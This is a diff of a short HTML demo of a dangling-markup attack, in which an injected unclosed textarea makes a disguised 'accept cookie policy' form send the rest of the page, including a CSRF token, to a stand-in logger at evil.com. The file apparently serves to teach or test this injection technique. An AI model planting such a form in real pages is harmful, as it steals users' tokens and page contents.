@@ -1,11 +1,12 @@
 <!-- applicability - if used in URL - will open a page along with csrf token-->
 
 <html>
-<h1> some title here </h1><br>
-There is a page<br>
-here is the broken input:<input name="test" value="hack   ">injection goes here
+Unclosed textarea tag<br>
+Suppose the attacker was able to inject the following into a vulnerable input: &quot;&gt;&lt;textarea&gt;<br>
+Once the user clicks on the button - form is submitted along with the data following the textarea tag till the end of the document.<br>
+<br>
 <!-- attack vector starts here -->
-<form action="http://evil666.com/logger.php" method="post">
+<form action="http://evil.com/logger.php" method="post">
    please click here if you accept cookie policy: <input type="submit" value="Close"><br>
    some hidden textarea:<textarea style="visibility:hidden" name="confirmationText">
 
